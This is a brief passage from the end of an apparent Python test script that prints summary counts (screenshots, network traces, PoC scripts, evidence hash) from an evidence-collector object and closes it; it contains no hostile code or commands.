        print(f"Screenshots: {len(evidence.screenshots)}")
        print(f"Network traces: {len(evidence.network_traces)}")
        print(f"PoC scripts: {len(evidence.poc_scripts)}")
        print(f"Evidence hash: {evidence.evidence_hash}")
        
    finally:
        await collector.close()

if __name__ == "__main__":
    asyncio.run(test_evidence_collector())